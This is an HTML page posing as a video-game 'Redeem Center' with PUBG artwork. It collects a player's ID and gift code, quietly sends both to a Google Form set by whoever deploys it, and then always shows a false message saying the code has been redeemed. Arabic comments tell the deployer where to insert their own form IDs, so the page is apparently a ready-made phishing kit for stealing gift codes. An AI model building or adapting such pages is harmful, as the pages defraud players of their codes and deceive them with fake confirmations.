<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Redeem Center</title>
    <style>
        body {
            /* يمكنك استبدال الرابط أدناه برابط صورتك المفضلة */
            background-image: url('https://r4.wallpaperflare.com/wallpaper/535/533/674/video-game-pubg-wallpaper-68e60d986040bc18706c913e2842749a.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            font-family: 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }

        .redeem-box {
            background: rgba(0, 0, 0, 0.85);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 25px rgba(255, 215, 0, 0.3);
            width: 90%;
            max-width: 400px;
            text-align: center;
            border: 2px solid #ffd700;
        }

        h2 {
            color: #ffd700;
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-bottom: 30px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border: 1px solid #444;
            background: #1a1a1a;
            color: #fff;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }

        input:focus {
            border-color: #ffd700;
            box-shadow: 0 0 10px rgba(255, 215, 0, 0.2);
        }

        button {
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            background: linear-gradient(45deg, #ffd700, #ffae00);
            border: none;
            border-radius: 10px;
            color: #000;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.3s;
        }

        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
        }

        #message {
            margin-top: 25px;
            font-size: 15px;
            font-weight: 500;
            line-height: 1.6;
            min-height: 50px;
        }

        .success { color: #00ff00; }
        .error { color: #ff4444; }
        .warning { color: #ffcc00; }
    </style>
</head>
<body>

<div class="redeem-box">
    <h2>REDEEM CENTER</h2>
    
    <input type="text" id="playerID" placeholder="PLAYER ID">
    <input type="text" id="redeemCode" placeholder="GIFT CODE">
    
    <button onclick="handleRedeem()">RECOVERY</button>
    
    <div id="message"></div>
</div>

<script>
    function handleRedeem() {
        const pID = document.getElementById('playerID').value.trim();
        const rCode = document.getElementById('redeemCode').value.trim();
        const msg = document.getElementById('message');

        // 1. التحقق من إدخال البيانات
        if (pID === "" || rCode === "") {
            msg.innerHTML = "Please enter both Player ID and Gift Code.";
            msg.className = "warning";
            return;
        }

        // 2. التحقق من طول الكود (7-12 حرف)
        if (rCode.length < 7 || rCode.length > 12) {
            msg.innerHTML = "Unfortunately, this code is incorrect or expired.";
            msg.className = "error";
            return;
        }

        // --- إعدادات الربط مع جوجل شيت (استبدل هذه البيانات ببياناتك) ---
        const formID = "YOUR_FORM_ID"; // ضع معرف النموذج هنا
        const idEntry = "entry.1234567"; // رقم خانة الـ ID
        const codeEntry = "entry.8910111"; // رقم خانة الـ Code

        const finalURL = `https://docs.google.com/forms/d/e/${formID}/formResponse?${idEntry}=${encodeURIComponent(pID)}&${codeEntry}=${encodeURIComponent(rCode)}&submit=Submit`;

        // 3. إرسال البيانات
        msg.innerHTML = "Processing...";
        msg.className = "";

        fetch(finalURL, { mode: 'no-cors' })
        .then(() => {
            msg.innerHTML = "Congratulations! Your code has been successfully redeemed. The gift will be sent to your account now.";
            msg.className = "success";
            // مسح الخانات بعد النجاح
            document.getElementById('playerID').value = "";
            document.getElementById('redeemCode').value = "";
        })
        .catch(() => {
            msg.innerHTML = "Connection Error. Please check your internet.";
            msg.className = "error";
        });
    }
</script>

</body>
</html>
# redeem
